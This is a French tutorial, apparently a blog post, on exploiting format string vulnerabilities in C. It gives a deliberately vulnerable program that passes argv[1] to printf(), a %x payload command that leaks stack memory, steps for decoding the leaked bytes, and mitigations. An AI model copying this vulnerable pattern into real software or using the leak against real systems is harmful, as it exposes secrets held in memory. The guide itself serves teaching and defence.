Exploitation de Format String - Guide pratique

Comprendre et exploiter les vulnérabilités de format string dans les applications C/C++

Apr 4, 2024
3 minute read

Présentation des vulnérabilités de Format String

Les vulnérabilités de format string surviennent lorsqu’une entrée utilisateur est utilisée directement comme premier argument dans des fonctions comme printf() sans être correctement formatée. Ce type de vulnérabilité peut permettre de lire ou même modifier la mémoire d’un programme.

Exemple de code vulnérable 

#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]){
    char buffer[32];
    // Lecture d'un fichier sensible
    FILE *secret = fopen("/etc/secret.txt", "rt");
    fgets(buffer, sizeof(buffer), secret);
    // Vulnérabilité: argv[1] est utilisé directement comme format string
    printf(argv[1]);
    fclose(secret);
    return 0;
}

Dans cet exemple, l’entrée utilisateur (argv[1]) est passée directement à printf() sans être formatée. Cette vulnérabilité peut être exploitée pour extraire des informations du programme.

Exploitation de la vulnérabilité

Étape 1 : Inspection de la pile avec %x

Pour examiner la pile, on peut utiliser le format %x qui affiche des valeurs sous forme hexadécimale :

./programme "$(python3 -c 'print("%x " * 20)')"

Cette commande révèle des valeurs hexadécimales de la pile, par exemple :

00000020 0804b008 b7e562f3 00000000 08049ff4 00000002 bffffbc4 bffffce2 0000002f 0804b008 39617044 28293664 6d617045 00000a64 b7e564ad b7fd03c4 b7fff000 08048579 9fe96a00 08048570

Étape 2 : Identification des données intéressantes

Dans le résultat, on peut repérer des valeurs qui semblent contenir des caractères ASCII. Par exemple, les valeurs suivantes pourraient être intéressantes :

39617044 28293664 6d617045 00000a64

Étape 3 : Conversion Little-Endian vers Big-Endian

Les valeurs sont stockées en format Little-Endian (octet de poids faible en premier). Pour les convertir en format lisible, on doit inverser l’ordre des octets :

39617044 -> 44706139 
28293664 -> 64362928 
6d617045 -> 45706d61 
00000a64 -> 640a0000

Étape 4 : Conversion hexadécimal vers ASCII

Ensuite, on peut convertir ces valeurs hexadécimales en ASCII :

echo -n "44706139 64362928 45706d61 640a0000" | xxd -r -p

Cette commande nous donnera le contenu mémoire décodé (mot de passe, flag, etc.).

Comprendre l’Endianness

L’endianness fait référence à la manière dont les octets sont ordonnés en mémoire :

Little-Endian

Dans les systèmes Little-Endian (comme x86), l’octet de poids faible est stocké à l’adresse mémoire la plus basse :

Valeur: 0x12345678
Mémoire: 0x78 0x56 0x34 0x12

Big-Endian

Dans les systèmes Big-Endian (comme certains processeurs RISC), l’octet de poids fort est stocké à l’adresse mémoire la plus basse :

Valeur: 0x12345678
Mémoire: 0x12 0x34 0x56 0x78

Techniques avancées d’exploitation

Les vulnérabilités de format string permettent non seulement de lire la mémoire, mais aussi :

  1. Écrire dans la mémoire avec %n qui écrit le nombre de caractères déjà imprimés
  2. Divulguer des adresses pour contourner l’ASLR
  3. Modifier des variables en écrivant à des adresses spécifiques
  4. Rediriger l’exécution en modifiant des pointeurs de fonction (GOT/PLT)

Mesures de protection

Pour éviter les vulnérabilités de format string :

  • Toujours utiliser des formats explicites : printf("%s", user_input);
  • Utiliser des fonctions sécurisées comme snprintf()
  • Compiler avec -Wformat -Werror=format-security
  • Éviter d’utiliser des entrées utilisateur comme premier argument de fonctions de formatage

Les vulnérabilités de format string sont moins courantes aujourd’hui, mais elles existent encore dans les systèmes legacy et constituent une compétence fondamentale en exploitation binaire.
